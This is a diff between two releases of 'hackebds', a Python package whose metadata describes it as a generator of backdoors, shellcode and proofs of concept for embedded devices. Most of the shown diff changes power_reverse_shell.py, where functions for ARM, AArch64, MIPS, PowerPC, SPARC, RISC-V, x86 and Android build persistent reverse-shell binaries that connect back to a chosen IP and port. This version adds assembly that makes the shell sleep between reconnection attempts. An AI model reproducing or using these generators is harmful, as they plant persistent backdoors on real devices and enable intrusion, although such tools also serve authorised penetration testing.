# Comparing `tmp/hackebds-0.3.6.tar.gz` & `tmp/hackebds-0.3.7.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "dist/hackebds-0.3.6.tar", last modified: Mon Mar 27 03:02:38 2023, max compression
+gzip compressed data, was "dist/hackebds-0.3.7.tar", last modified: Mon Jul 10 04:05:44 2023, max compression
```

## Comparing `hackebds-0.3.6.tar` & `hackebds-0.3.7.tar`

### file list

```diff
@@ -1,33 +1,33 @@
-drwxrwxr-x   0 root         (0) root         (0)        0 2023-03-27 03:02:38.000000 hackebds-0.3.6/
--rw-r--r--   0 root         (0) root         (0)       38 2023-03-27 03:02:38.000000 hackebds-0.3.6/setup.cfg
-drwxrwxr-x   0 root         (0) root         (0)        0 2023-03-27 03:02:38.000000 hackebds-0.3.6/hackebds.egg-info/
--rw-r--r--   0 root         (0) root         (0)      686 2023-03-27 03:02:38.000000 hackebds-0.3.6/hackebds.egg-info/SOURCES.txt
--rw-r--r--   0 root         (0) root         (0)        9 2023-03-27 03:02:38.000000 hackebds-0.3.6/hackebds.egg-info/top_level.txt
--rw-r--r--   0 root         (0) root         (0)        1 2023-03-27 03:02:38.000000 hackebds-0.3.6/hackebds.egg-info/dependency_links.txt
--rw-r--r--   0 root         (0) root         (0)       73 2023-03-27 03:02:38.000000 hackebds-0.3.6/hackebds.egg-info/requires.txt
--rw-r--r--   0 root         (0) root         (0)    23602 2023-03-27 03:02:38.000000 hackebds-0.3.6/hackebds.egg-info/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)       44 2023-03-27 03:02:38.000000 hackebds-0.3.6/hackebds.egg-info/entry_points.txt
-drwxrwxr-x   0 root         (0) root         (0)        0 2023-03-27 03:02:38.000000 hackebds-0.3.6/hackebds/
--rw-rw-r--   0 root         (0) root         (0)     2689 2023-03-16 03:30:58.000000 hackebds-0.3.6/hackebds/aarch64.py
--rw-rw-r--   0 root         (0) root         (0)     9213 2023-03-16 03:30:59.000000 hackebds-0.3.6/hackebds/sparc32.py
--rw-rw-r--   0 root         (0) root         (0)    22680 2023-03-16 03:30:58.000000 hackebds-0.3.6/hackebds/mips32n.py
--rw-rw-r--   0 root         (0) root         (0)     8998 2023-03-16 03:30:58.000000 hackebds-0.3.6/hackebds/sparc64.py
--rw-r--r--   0 root         (0) root         (0)    71301 2023-03-16 03:30:58.000000 hackebds-0.3.6/hackebds/power_reverse_shell.py
--rw-rw-r--   0 root         (0) root         (0)    43922 2023-03-16 03:30:58.000000 hackebds-0.3.6/hackebds/hackebds_cmd.py
--rw-rw-r--   0 root         (0) root         (0)    27268 2023-03-16 03:30:58.000000 hackebds-0.3.6/hackebds/powerpc_info.py
--rw-rw-r--   0 root         (0) root         (0)     2657 2023-03-16 03:30:59.000000 hackebds-0.3.6/hackebds/cve_info.py
--rw-r--r--   0 root         (0) root         (0)    42355 2023-03-27 02:50:52.000000 hackebds-0.3.6/hackebds/model_choise.py
--rw-r--r--   0 root         (0) root         (0)   127068 2023-03-27 02:48:51.000000 hackebds-0.3.6/hackebds/__init__.py
--rw-r--r--   0 root         (0) root         (0)    12976 2023-03-16 03:30:58.000000 hackebds-0.3.6/hackebds/my_package.py
--rw-rw-r--   0 root         (0) root         (0)    74541 2023-03-16 03:30:58.000000 hackebds-0.3.6/hackebds/power_bind_shell.py
--rw-rw-r--   0 root         (0) root         (0)      232 2023-03-16 03:30:58.000000 hackebds-0.3.6/hackebds/extract_shellcode.py
--rw-rw-r--   0 root         (0) root         (0)     2786 2023-03-16 03:30:58.000000 hackebds-0.3.6/hackebds/ESH.py
--rw-rw-r--   0 root         (0) root         (0)    11320 2023-03-16 03:30:58.000000 hackebds-0.3.6/hackebds/arm.py
--rw-r--r--   0 root         (0) root         (0)        0 2023-03-16 03:30:58.000000 hackebds-0.3.6/hackebds/hackebds_script.py
--rw-rw-r--   0 root         (0) root         (0)     1291 2023-03-16 03:30:59.000000 hackebds-0.3.6/hackebds/backdoor_encode.py
--rw-r--r--   0 root         (0) root         (0)   184509 2023-03-27 02:44:29.000000 hackebds-0.3.6/hackebds/exp_database.py
--rw-rw-r--   0 root         (0) root         (0)     3728 2023-03-16 03:30:58.000000 hackebds-0.3.6/hackebds/mips.py
--rw-r--r--   0 root         (0) root         (0)    21308 2023-02-22 03:14:05.000000 hackebds-0.3.6/README.md
--rw-r--r--   0 root         (0) root         (0)    19338 2023-03-27 03:01:41.000000 hackebds-0.3.6/README.rst
--rw-rw-r--   0 root         (0) root         (0)    23602 2023-03-27 03:02:38.000000 hackebds-0.3.6/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)     1216 2023-03-09 03:47:21.000000 hackebds-0.3.6/setup.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-07-10 04:05:44.000000 hackebds-0.3.7/
+-rw-rw-r--   0 root         (0) root         (0)    19338 2023-06-21 03:41:25.000000 hackebds-0.3.7/README.rst
+-rw-r--r--   0 root         (0) root         (0)    23602 2023-07-10 04:05:44.000000 hackebds-0.3.7/PKG-INFO
+-rw-rw-r--   0 root         (0) root         (0)       38 2023-07-10 04:05:44.000000 hackebds-0.3.7/setup.cfg
+-rw-rw-r--   0 root         (0) root         (0)     1216 2023-07-10 04:05:38.000000 hackebds-0.3.7/setup.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-07-10 04:05:44.000000 hackebds-0.3.7/hackebds/
+-rw-rw-r--   0 root         (0) root         (0)      232 2023-06-21 03:41:25.000000 hackebds-0.3.7/hackebds/extract_shellcode.py
+-rw-rw-r--   0 root         (0) root         (0)        0 2023-06-21 03:41:25.000000 hackebds-0.3.7/hackebds/hackebds_script.py
+-rw-rw-r--   0 root         (0) root         (0)    74519 2023-07-10 02:32:48.000000 hackebds-0.3.7/hackebds/power_bind_shell.py
+-rw-rw-r--   0 root         (0) root         (0)     9213 2023-06-21 03:41:25.000000 hackebds-0.3.7/hackebds/sparc32.py
+-rw-rw-r--   0 root         (0) root         (0)    47690 2023-07-10 03:14:24.000000 hackebds-0.3.7/hackebds/model_choise.py
+-rw-rw-r--   0 root         (0) root         (0)     2657 2023-06-21 03:41:25.000000 hackebds-0.3.7/hackebds/cve_info.py
+-rw-rw-r--   0 root         (0) root         (0)     1291 2023-06-21 03:41:25.000000 hackebds-0.3.7/hackebds/backdoor_encode.py
+-rw-rw-r--   0 root         (0) root         (0)     2689 2023-06-21 03:41:25.000000 hackebds-0.3.7/hackebds/aarch64.py
+-rw-rw-r--   0 root         (0) root         (0)     3728 2023-06-21 03:41:25.000000 hackebds-0.3.7/hackebds/mips.py
+-rw-rw-r--   0 root         (0) root         (0)    22680 2023-06-21 03:41:25.000000 hackebds-0.3.7/hackebds/mips32n.py
+-rw-rw-r--   0 root         (0) root         (0)     2786 2023-06-21 03:41:25.000000 hackebds-0.3.7/hackebds/ESH.py
+-rw-rw-r--   0 root         (0) root         (0)     8998 2023-06-21 03:41:25.000000 hackebds-0.3.7/hackebds/sparc64.py
+-rw-rw-r--   0 root         (0) root         (0)    74711 2023-07-10 02:24:13.000000 hackebds-0.3.7/hackebds/power_reverse_shell.py
+-rw-rw-r--   0 root         (0) root         (0)   127366 2023-07-10 03:33:22.000000 hackebds-0.3.7/hackebds/__init__.py
+-rw-rw-r--   0 root         (0) root         (0)    27268 2023-06-21 03:41:25.000000 hackebds-0.3.7/hackebds/powerpc_info.py
+-rw-rw-r--   0 root         (0) root         (0)    43922 2023-06-21 03:41:25.000000 hackebds-0.3.7/hackebds/hackebds_cmd.py
+-rw-rw-r--   0 root         (0) root         (0)   214875 2023-07-02 13:12:56.000000 hackebds-0.3.7/hackebds/exp_database.py
+-rw-rw-r--   0 root         (0) root         (0)    11320 2023-06-21 03:41:25.000000 hackebds-0.3.7/hackebds/arm.py
+-rw-rw-r--   0 root         (0) root         (0)    12977 2023-07-10 02:29:39.000000 hackebds-0.3.7/hackebds/my_package.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-07-10 04:05:44.000000 hackebds-0.3.7/hackebds.egg-info/
+-rw-rw-r--   0 root         (0) root         (0)    23602 2023-07-10 04:05:43.000000 hackebds-0.3.7/hackebds.egg-info/PKG-INFO
+-rw-rw-r--   0 root         (0) root         (0)       44 2023-07-10 04:05:43.000000 hackebds-0.3.7/hackebds.egg-info/entry_points.txt
+-rw-rw-r--   0 root         (0) root         (0)      686 2023-07-10 04:05:43.000000 hackebds-0.3.7/hackebds.egg-info/SOURCES.txt
+-rw-rw-r--   0 root         (0) root         (0)        9 2023-07-10 04:05:43.000000 hackebds-0.3.7/hackebds.egg-info/top_level.txt
+-rw-rw-r--   0 root         (0) root         (0)        1 2023-07-10 04:05:43.000000 hackebds-0.3.7/hackebds.egg-info/dependency_links.txt
+-rw-rw-r--   0 root         (0) root         (0)       73 2023-07-10 04:05:43.000000 hackebds-0.3.7/hackebds.egg-info/requires.txt
+-rw-------   0 root         (0) root         (0)    19210 2023-06-21 03:41:25.000000 hackebds-0.3.7/README.md
```

### Comparing `hackebds-0.3.6/hackebds.egg-info/SOURCES.txt` & `hackebds-0.3.7/hackebds.egg-info/SOURCES.txt`

 * *Files identical despite different names*

### Comparing `hackebds-0.3.6/hackebds.egg-info/PKG-INFO` & `hackebds-0.3.7/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 1.2
 Name: hackebds
-Version: 0.3.6
+Version: 0.3.7
 Summary: This tool is used for backdoor,shellcode generation,Information retrieval and POC generation for various architecture devices
 Home-page: https://github.com/doudoudedi/hackEmbedded
 Author: doudoudedi
 Author-email: doudoudedi233@gmail.com
 License: GPL-3.0
 Description: hackebds
         ========
```

### Comparing `hackebds-0.3.6/hackebds/aarch64.py` & `hackebds-0.3.7/hackebds/aarch64.py`

 * *Files identical despite different names*

### Comparing `hackebds-0.3.6/hackebds/sparc32.py` & `hackebds-0.3.7/hackebds/sparc32.py`

 * *Files identical despite different names*

### Comparing `hackebds-0.3.6/hackebds/mips32n.py` & `hackebds-0.3.7/hackebds/mips32n.py`

 * *Files identical despite different names*

### Comparing `hackebds-0.3.6/hackebds/sparc64.py` & `hackebds-0.3.7/hackebds/sparc64.py`

 * *Files identical despite different names*

### Comparing `hackebds-0.3.6/hackebds/power_reverse_shell.py` & `hackebds-0.3.7/hackebds/power_reverse_shell.py`

 * *Files 3% similar despite different names*

```diff
@@ -22,15 +22,15 @@
 add armebv7-power-reverse_sh
 
 '''
 
 
 
 
-def armelv7_power_reverse_shell(shell_path, reverse_ip, reverse_port, envp, filename= None):
+def armelv7_power_reverse_shell(shell_path, reverse_ip, reverse_port, envp, sleep_time,filename= None):
 	context.arch = 'arm'
 	context.endian = 'little'
 	context.bits = '32'
 	log.success("reverse_ip is: "+ reverse_ip)
 	log.success("reverse_port is: "+str(reverse_port))
 	shell_path_list = []
 	if shell_path == "/bin/bash" or shell_path == "bash":
@@ -86,14 +86,24 @@
 
 	shellcode += '''
 main_lab:
 	'''
 
 	shellcode += shellcraft.wait4("r3")
 
+	shellcode += """
+ldr r10, ={time}
+eor r5, r5
+push {{r5}}
+push {{r10}}
+mov r0, sp
+mov r7, 0xa2
+svc #0
+	""".format(time=sleep_time)
+
 	shellcode += '''
 b __start
 nop
 	'''
 	#shellcode = asm(shellcode)
 
 	if(filename==None):
@@ -125,15 +135,15 @@
 				context.arch='i386'
 				context.bits="32"
 				context.endian="little"
 			else:
 				return 
 
 
-def armebv7_power_reverse_shell(shell_path, reverse_ip, reverse_port , envp, filename=None):
+def armebv7_power_reverse_shell(shell_path, reverse_ip, reverse_port , envp, sleep_time,filename=None):
 	context.arch = 'arm'
 	context.endian = 'big'
 	context.bits = '32'
 	log.success("reverse_ip is: "+ reverse_ip)
 	log.success("reverse_port is: "+str(reverse_port))
 	shell_path_list = []
 	if shell_path == "/bin/bash" or shell_path == "bash":
@@ -189,14 +199,24 @@
 
 	shellcode += '''
 main_lab:
 	'''
 
 	shellcode += shellcraft.wait4("r3")
 
+	shellcode += """
+ldr r10, ={time}
+eor r5, r5
+push {{r5}}
+push {{r10}}
+mov r0, sp
+mov r7, 0xa2
+svc #0
+	""".format(time=sleep_time)
+
 	shellcode += '''
 b __start
 nop
 	'''
 	#shellcode = asm(shellcode)
 
 	if(filename==None):
@@ -229,15 +249,15 @@
 				context.bits="32"
 				context.endian="little"
 			else:
 				return 
 
 
 
-def aarch64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def aarch64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'aarch64'
 	context.endian = 'little'
 	context.bits = '64'
 	log.success("reverse_ip is: "+ reverse_ip)
 	log.success("reverse_port is: "+str(reverse_port))
 	shell_path_list = []
 	if shell_path == "/bin/bash" or shell_path == "bash":
@@ -372,14 +392,24 @@
 
 	shellcode += '''
 main_lab:
 	'''
 
 	shellcode += shellcraft.wait4("x11")
 
+	shellcode += """
+LDR X12, ={time}
+eor x11, x11, x11
+str x11, [sp, #-8]!
+str x12, [sp, #-8]!
+mov x0, sp
+mov  x8, #0x65
+svc 0
+	""".format(time=sleep_time)
+
 	shellcode += '''
 b __start
 nop
 	'''
 
 	if(filename==None):
 		log.info("waiting 3s")
@@ -411,15 +441,15 @@
 				context.bits="32"
 				context.endian="little"
 			else:
 				return 
 
 
 
-def mipsel_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def mipsel_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'mips'
 	context.endian = 'little'
 	context.bits = '32'
 	log.success("reverse_ip is: "+ reverse_ip)
 	log.success("reverse_port is: "+str(reverse_port))
 	shell_path_list = []
 	if shell_path == "/bin/bash" or shell_path == "bash":
@@ -476,14 +506,26 @@
 
 	shellcode += '''
 main_lab:
 	'''
 
 	shellcode += shellcraft.wait4("$s5")
 
+	shellcode += """
+xor  $t0,$t0,$t0
+addiu $sp, $sp, -4
+sw   $t0, 0($sp)
+li   $t0,{time}
+addiu $sp, $sp, -4
+sw   $t0, 0($sp)
+move $a0,$sp
+li   $v0, 0x1046
+syscall 0x40404
+	""".format(time=sleep_time)
+
 	shellcode += '''
 j __start
 nop
 	'''
 	if(filename==None):
 		log.info("waiting 3s")
 		sleep(1)
@@ -512,18 +554,20 @@
 				log.success("{} generated successfully".format(filename))
 				context.arch='i386'
 				context.bits="32"
 				context.endian="little"
 			else:
 				return 
 
+'''
+sleep num 5034
+'''
 
 
-
-def mips_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def mips_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'mips'
 	context.endian = 'big'
 	context.bits = '32'
 	log.success("reverse_ip is: "+ reverse_ip)
 	log.success("reverse_port is: "+str(reverse_port))
 	shell_path_list = []
 	if shell_path == "/bin/bash" or shell_path == "bash":
@@ -580,14 +624,26 @@
 
 	shellcode += '''
 main_lab:
 	'''
 
 	shellcode += shellcraft.wait4("$s5")
 
+	shellcode += """
+xor  $t0,$t0,$t0
+addiu $sp, $sp, -4
+sw   $t0, 0($sp)
+li   $t0,{time}
+addiu $sp, $sp, -4
+sw   $t0, 0($sp)
+move $a0,$sp
+li   $v0, 0x1046
+syscall 0x40404
+	""".format(time=sleep_time)
+
 	shellcode += '''
 j __start
 nop
 	'''
 	if(filename==None):
 		log.info("waiting 3s")
 		sleep(1)
@@ -624,15 +680,15 @@
 '''
 add 2023.1.13
 mips64-power
 mips64el-power
 '''
 
 
-def mips64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def mips64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'mips64'
 	context.endian = 'big'
 	context.bits = '64'
 	log.success("reverse_ip is: "+ reverse_ip)
 	log.success("reverse_port is: "+str(reverse_port))
 	reverse_port = int(hex(reverse_port), 16)
 	reverse_port = hex(0x10000 - int("0x" + enhex(p16(reverse_port)), 16) - 1)
@@ -801,23 +857,39 @@
 exit  syscall num 0x00000000001455
 	'''
 	shellcode += '''
 xor $a0, $a0, $a0
 li  $v0, 0x01455
 syscall
 	'''
+
+
 	
 	shellcode += '''
 main_lab:
 move $a0,$s5
 xor  $a1,$a1,$a1
 xor  $a2,$a2,$a2
 xor  $a3,$a3,$a3
 li   $v0,0x13c3
 syscall
+	'''
+	shellcode += """
+xor $a0, $a0, $a0
+daddiu $sp, $sp, -8
+sw   $t0, 0($sp)
+li  $t0,{time}
+daddiu $sp, $sp, -8
+sw   $t0, 4($sp)
+move $a0, $sp
+li  $v0, 5034
+syscall
+	""".format(time = sleep_time)
+
+	shellcode+='''
 j _start
 nop
 	'''
 
 	if(filename==None):
 		log.info("waiting 3s")
 		sleep(1)
@@ -847,15 +919,15 @@
 				context.arch='i386'
 				context.bits="32"
 				context.endian="little"
 			else:
 				return 
 
 
-def mips64el_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def mips64el_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'mips64'
 	context.endian = 'little'
 	context.bits = '64'
 	log.success("reverse_ip is: "+ reverse_ip)
 	log.success("reverse_port is: "+str(reverse_port))
 	reverse_port=int(hex(reverse_port),16)
 	reverse_port=hex(0x10000-int("0x"+enhex(p16(reverse_port)),16)-1)
@@ -1028,14 +1100,27 @@
 main_lab:
 move $a0,$s5
 xor  $a1,$a1,$a1
 xor  $a2,$a2,$a2
 xor  $a3,$a3,$a3
 li   $v0,0x13c3
 syscall
+	'''
+	shellcode += """
+xor $a0, $a0, $a0
+daddiu $sp, $sp, -8
+sw   $t0, 0($sp)
+li  $t0,{time}
+daddiu $sp, $sp, -8
+sw   $t0, 0($sp)
+move $a0, $sp
+li  $v0, 5034
+syscall
+	""".format(time = sleep_time)
+	shellcode +='''
 j _start
 nop
 
 	'''
 	if(filename==None):
 		log.info("waiting 3s")
 		sleep(1)
@@ -1066,15 +1151,15 @@
 				context.bits="32"
 				context.endian="little"
 			else:
 				return 
 
 
 
-def powerpc_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def powerpc_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'powerpc'
 	context.endian = 'big'
 	context.bits = '32'
 	log.success("reverse_ip is: "+ reverse_ip)
 	log.success("reverse_port is: "+str(reverse_port))
 	reverse_ip = reverse_ip.split('.')
 	handle_ip_0="0x"+enhex(p8(int(reverse_ip[0])))
@@ -1216,14 +1301,33 @@
 main_lab:
 mr  3, 11
 xor 4,4,4
 xor 5,5,5
 xor 6,6,6
 li  0,0x72
 sc
+'''
+	sleep_time = int(sleep_time,16)
+	sleep_time_high = sleep_time>>16 &0xffff
+	sleep_time_low = sleep_time & 0xffff
+	shellcode += """
+mr 31, 1
+li 0, 0xa2
+xor  3,3,3
+subi 31, 31, 4
+stw  3, 0(31)
+lis r3, {time_high}
+ori r3, r3, {time_low}
+subi 31, 31, 4
+stw  3, 0(31)
+mr  3, 31
+sc
+""".format(time_high=sleep_time_high,time_low = sleep_time_low)
+
+	shellcode +='''
 b _start
 nop
 	'''
 
 	if(filename==None):
 		log.info("waiting 3s")
 		sleep(1)
@@ -1253,15 +1357,15 @@
 				context.arch='i386'
 				context.bits="32"
 				context.endian="little"
 			else:
 				return 
 
 
-def powerpcle_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def powerpcle_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'powerpc'
 	context.endian = 'little'
 	context.bits = '32'
 	log.success("reverse_ip is: "+ reverse_ip)
 	log.success("reverse_port is: "+str(reverse_port))
 	reverse_ip = reverse_ip.split('.')
 	handle_ip_0="0x"+enhex(p8(int(reverse_ip[0])))
@@ -1407,14 +1511,33 @@
 main_lab:
 mr  3, 11
 xor 4,4,4
 xor 5,5,5
 xor 6,6,6
 li  0,0x72
 sc
+'''
+	sleep_time = int(sleep_time,16)
+	sleep_time_high = sleep_time>>16 &0xffff
+	sleep_time_low = sleep_time & 0xffff
+	shellcode += """
+mr 31, 1
+li 0, 0xa2
+xor  3,3,3
+subi 31, 31, 4
+stw  3, 0(31)
+lis r3, {time_high}
+ori r3, r3, {time_low}
+subi 31, 31, 4
+stw  3, 0(31)
+mr  3, 31
+sc
+""".format(time_high=sleep_time_high,time_low = sleep_time_low)
+
+	shellcode += '''
 b _start
 nop
 	'''
 	if(filename==None):
 		log.info("waiting 3s")
 		sleep(1)
 		filename=context.arch + "-power-" + my_package.random_string_generator(4,chars)
@@ -1449,15 +1572,15 @@
 '''
 add 2023.1.14
 riscv64 power 
 
 Android power
 '''
 
-def riscv64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def riscv64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'riscv'
 	context.endian = 'little'
 	context.bits = '64'
 	log.success("reverse_ip is: "+ reverse_ip)
 	log.success("reverse_port is: "+str(reverse_port))
 	reverse_ip=reverse_ip.split(".")[::-1]
 	reverse_ip_new='0x'
@@ -1599,15 +1722,15 @@
 				context.arch='i386'
 				context.bits="32"
 				context.endian="little"
 			else:
 				return 
 
 
-def android_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def android_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'aarch64'
 	context.endian = 'little'
 	context.bits = '64'
 	log.success("reverse_ip is: "+ reverse_ip)
 	log.success("reverse_port is: "+str(reverse_port))
 	if shell_path == "/bin/bash" or shell_path == "bash":
 		shellcode_execve = '''
@@ -1740,14 +1863,25 @@
 
 	shellcode += '''
 main_lab:
 	'''
 
 	shellcode += shellcraft.wait4("x11")
 
+
+	shellcode += """
+LDR X12, ={time}
+eor x11, x11, x11
+str x11, [sp, #-8]!
+str x12, [sp, #-8]!
+mov x0, sp
+mov  x8, #0x65
+svc 0
+	""".format(time=sleep_time)
+
 	shellcode += '''
 b __start
 nop
 	'''
 
 	if(filename==None):
 		log.info("waiting 3s")
@@ -1786,15 +1920,15 @@
 
 sparc_power_reverse
 sparc64_power
 
 '''
 
 
-def sparc_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def sparc_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'sparc'
 	context.endian = 'big'
 	context.bits = '32'
 	log.success("reverse_ip is: "+ reverse_ip)
 	log.success("reverse_port is: "+str(reverse_port))
 	reverse_ip = reverse_ip.split('.')
 	reverse_ip_1 = "0x"+enhex(p8(int(reverse_ip[0])))
@@ -1971,15 +2105,15 @@
 				log.success("{} generated successfully".format(filename))
 				context.arch='i386'
 				context.bits="32"
 				context.endian="little"
 			else:
 				return 
 
-def sparc64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def sparc64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'sparc64'
 	context.endian = 'big'
 	context.bits = '64'
 	log.success("reverse_ip is: "+ reverse_ip)
 	log.success("reverse_port is: "+str(reverse_port))
 	reverse_ip = reverse_ip.split('.')
 	reverse_ip_1 = "0x"+enhex(p8(int(reverse_ip[0])))
@@ -2154,15 +2288,15 @@
 				context.bits="32"
 				context.endian="little"
 			else:
 				return 
 
 
 
-def x86_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def x86_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'i386'
 	context.endian = 'little'
 	context.bits = '32'
 	log.success("reverse_ip is: "+ reverse_ip)
 	log.success("reverse_port is: "+str(reverse_port))
 	shell_path_list = []
 	if shell_path == "/bin/bash" or shell_path == "bash":
@@ -2200,16 +2334,21 @@
 	shellcode += shellcraft.exit(0)
 	shellcode += '''
 main_lab:
 	push 0x72
 	pop eax
 	xor ebx,ebx
 	int 0x80
+	push 0x0
+	push {time}
+	mov  ebx, esp
+	mov eax, 162
+	int 0x80
 	jmp _start
-	'''
+	'''.format(time=sleep_time)
 	if(filename==None):
 		log.info("waiting 3s")
 		sleep(1)
 		filename=context.arch + "-power-" + my_package.random_string_generator(4,chars)
 		my_package.my_make_elf(shellcode, filename)
 		log.success("{} is ok in current path ./".format(filename))
 		context.arch = 'i386'
@@ -2236,15 +2375,15 @@
 				context.bits="32"
 				context.endian="little"
 			else:
 				return 
 
 
 
-def armelv5_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def armelv5_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.bits="32"
 	context.arch='arm'
 	context.endian='little'
 	shell_path_list = []
 	if shell_path == "/bin/bash" or shell_path == "bash":
 		shellcode='''
 	.section .shellcode,"awx"
@@ -2296,17 +2435,14 @@
 	mov r7,#0x69
 	strb r7,[sp,#-0x1f]
 	mov r7,#0x2d
 	strb r7,[sp,#-0x20]
 	add r4,sp,#-0x1d
 	add r5,sp,#-0x2c
 	add r8,sp,#-0x20
-	add r3,pc,#1
-	bx  r3
-	.THUMB
 	main:
 	'''
 
 		shellcode += shellcraft.fork()
 
 		shellcode += '''
 	mov r3,r0
@@ -2317,51 +2453,62 @@
 		shellcode +='''
 	mov r1,#2
 	mov r0,r1
 	mov r1,#1
 	eor r2,r2,r2
 	mov r7,#200
 	add r7,r7,#81
-	svc #1
+	svc #0
 	mov r6,r0
 	mov r1,r5
 	mov r2,#0x10
 	add r7,r7,#2
-	svc #1
+	svc #0
 	mov r0,r6
 	eor r1,r1,r1
 	mov r7,#63
-	svc #1
+	svc #0
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc #0
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc #0
 	mov r0,r4
 	eor r1,r1,r1
 	eor r2,r2,r2
 	push {r1}
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #1
+	svc #0
 
 	'''
 
 		shellcode += shellcraft.exit(0)
 
 		shellcode += '''
 main_lab:
 	'''
 
 		shellcode += shellcraft.wait4("r3")
 
+		shellcode += """
+ldr r10, ={time}
+eor r5, r5
+push {{r5}}
+push {{r10}}
+mov r0, sp
+mov r7, 0xa2
+svc #0
+pop {{r5,r10}}
+	""".format(time=sleep_time)
+
 		shellcode += '''
-b main
+b _start
 nop
 	'''
 	elif shell_path == "/bin/sh" or shell_path == "sh":
 		shellcode='''
 	.section .shellcode,"awx"
 	.global _start
 	.global __start
@@ -2406,17 +2553,14 @@
 	mov r7,#0x69
 	strb r7,[sp,#-0x1f]
 	mov r7,#0x2d
 	strb r7,[sp,#-0x20]
 	add r4,sp,#-0x1b
 	add r5,sp,#-0x2c
 	add r8,sp,#-0x20
-	add r3,pc,#1
-	bx  r3
-	.THUMB
 	main:
 	'''
 
 		shellcode += shellcraft.fork()
 
 		shellcode += '''
 	mov r3,r0
@@ -2428,50 +2572,60 @@
 		shellcode += '''
 	mov r1,#2
 	mov r0,r1
 	mov r1,#1
 	eor r2,r2,r2
 	mov r7,#200
 	add r7,r7,#81
-	svc #1
+	svc #0
 	mov r6,r0
 	mov r1,r5
 	mov r2,#0x10
 	add r7,r7,#2
-	svc #1
+	svc #0
 	mov r0,r6
 	eor r1,r1,r1
 	mov r7,#63
-	svc #1
+	svc #0
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc #0
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc #0
 	mov r0,r4
 	eor r1,r1,r1
 	eor r2,r2,r2
 	push {r1}
 	push {r0}
 	mov r1,sp
 	mov r7,#0xb
-	svc #1
+	svc #0
 
 	'''
 		shellcode += shellcraft.exit(0)
 
 		shellcode += '''
 main_lab:
 	'''
 
 		shellcode += shellcraft.wait4("r3")
 
+		shellcode += """
+ldr r10, ={time}
+eor r5, r5
+push {{r5}}
+push {{r10}}
+mov r0, sp
+mov r7, 0xa2
+svc #0
+	""".format(time=sleep_time)
+
 		shellcode += '''
-b main
+b _start
 nop
 	'''
 
 	else:
 		log.info("now shell is only support sh and bash")
 		return 
 	if(envp == None):
@@ -2526,15 +2680,15 @@
 				context.arch='i386'
 				context.bits="32"
 				context.endian="little"
 			else:
 				return 
 
 
-def armebv5_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def armebv5_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.bits="32"
 	context.arch='arm'
 	context.endian='big'
 	if shell_path == "/bin/bash" or shell_path == "bash":
 		shellcode='''
 	.section .shellcode,"awx"
 	.global _start
@@ -2585,17 +2739,14 @@
 	mov r7,#0x69
 	strb r7,[sp,#-0x1f]
 	mov r7,#0x2d
 	strb r7,[sp,#-0x20]
 	add r4,sp,#-0x1d
 	add r8,sp,#-0x20
 	add r5,sp,#-0x2c
-	add r3,pc,#1
-	bx  r3
-	.THUMB
 	main:
 	'''
 
 		shellcode += shellcraft.fork()
 
 		shellcode += '''
 	mov r3,r0
@@ -2639,16 +2790,27 @@
 
 		shellcode += '''
 main_lab:
 	'''
 
 		shellcode += shellcraft.wait4("r3")
 
+		shellcode += """
+ldr r10, ={time}
+eor r5, r5
+push {{r5}}
+push {{r10}}
+mov r0, sp
+mov r7, 0xa2
+svc #0
+pop {{r5,r10}}
+	""".format(time=sleep_time)
+
 		shellcode += '''
-b main
+b _start
 nop
 	'''
 
 	elif shell_path == "/bin/sh" or shell_path == "sh":
 		shellcode = '''
 	.section .shellcode,"awx"
 	.global _start
